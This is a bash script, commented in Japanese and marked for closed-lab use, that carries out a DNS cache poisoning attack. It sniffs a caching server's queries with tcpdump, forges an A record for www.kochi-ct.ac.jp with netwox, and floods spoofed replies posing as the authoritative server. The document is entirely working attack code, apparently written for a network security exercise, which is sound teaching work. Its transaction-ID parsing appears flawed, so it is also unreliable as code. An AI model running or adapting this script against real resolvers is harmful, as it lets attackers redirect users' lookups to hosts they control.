#!/bin/bash
# dns_spoof_flood.sh
# DNSキャッシュ汚染実験用 高速連射版（閉じたラボ環境専用）
# 攻撃者VMで実行

# ==== 設定 ====
CACHE_DNS="192.168.56.102"   # キャッシュDNSサーバ
AUTH_DNS="192.168.56.103"    # 権威DNSサーバ（送信元を偽装）
FAKE_IP="192.168.56.104"     # 偽Aレコード
DOMAIN="www.kochi-ct.ac.jp"  # ターゲットドメイン
TTL="300"                    # 偽応答のTTL
BURST_COUNT=100              # 1つのTXIDに対して送信する偽応答の数
TMP_BIN="/tmp/dns_response.bin"

echo "[*] DNSキャッシュ汚染（高速連射版）を開始します。"
echo "[*] キャッシュサーバ(${CACHE_DNS})が権威サーバ(${AUTH_DNS})へ問い合わせるのを監視中..."
echo "[*] 1件の問い合わせごとに ${BURST_COUNT} 通の偽応答を送信します。"
echo "[*] Ctrl+C で終了します。"

while true; do
    # ==== 1. DNS問い合わせをキャプチャ ====
    TXID=$(sudo tcpdump -n -i any -c 1 "udp and src ${CACHE_DNS} and dst port 53" -vv -XX \
        | grep -A1 "0x0000:" \
        | tail -n1 \
        | awk '{print $1$2}')

    if [ -z "$TXID" ]; then
        echo "[!] TXID取得失敗。再試行します..."
        sleep 1
        continue
    fi

    echo "[+] TXID取得成功: $TXID"

    # ==== 2. 偽DNSレスポンス作成 ====
    sudo netwox 28 \
        -t 1 \
        -d $DOMAIN \
        -i $TXID \
        -r $FAKE_IP \
        -a $TTL \
        -f 1 > $TMP_BIN

    if [ $? -ne 0 ]; then
        echo "[!] DNSレスポンス作成に失敗しました。再試行します..."
        sleep 1
        continue
    fi

    # ==== 3. 偽応答を高速で大量送信 ====
    echo "[*] 偽応答を ${BURST_COUNT} 通連続で送信します..."
    for ((i=1; i<=BURST_COUNT; i++)); do
        sudo netwox 105 \
            -d $CACHE_DNS \
            -D 53 \
            -s $AUTH_DNS \
            -S 53 \
            -u @$TMP_BIN >/dev/null 2>&1 &
    done

    wait
    echo "[+] 偽応答送信完了 (${BURST_COUNT} 通)"

    echo "[*] 次の問い合わせを待機中..."
done
